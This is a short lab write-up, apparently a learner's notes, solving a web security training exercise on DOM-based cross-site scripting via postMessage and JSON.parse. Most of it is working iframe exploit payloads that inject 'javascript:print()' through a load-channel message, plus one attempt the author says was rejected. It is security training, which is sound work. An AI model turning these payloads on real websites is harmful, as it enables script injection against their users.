# Practitioner Lab 95: DOM XSS using web messages and JSON.parse

---

This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

![Untitled](Practitioner%20Lab%2095%20DOM%20XSS%20using%20web%20messages%20and%201714bfb75c9f4ecebad8c7d0cfb6c45d/Untitled.png)

```
<iframe id="target_website" src="https://0a08005803fce4c48068a319001000bf.web-security-academy.net/" onload="
    this.contentWindow.postMessage(JSON.stringify({
        type: 'player-height-changed',
        height: print()
    }), '*')">
```

this works but for some reason they don’t want 

by looking at the parameters you can see which can be used such as load-channel with url and with and height with player-height—changed. 

it seems the program only wants to be solved while using one type of payload as such the one that I had to use to solve the lab was 

```
<iframe src=https://0a08005803fce4c48068a319001000bf.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

```jsx
<style>
    body, html {
        margin: 0;
        height: 100%;
        overflow: hidden;
    }
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: 0;
    }
</style>
<iframe id="myIframe" src="https://0a730063039cd77e811bd4ee0066000f.web-security-academy.net/"></iframe>

<script>
var iframe = document.getElementById('myIframe');

iframe.onload = function() {
  // Send a message to the iframe's content window
  iframe.contentWindow.postMessage(JSON.stringify({ type: 'load-channel', url: 'javascript:print()//default.asp' }), '*');
};
</script>
```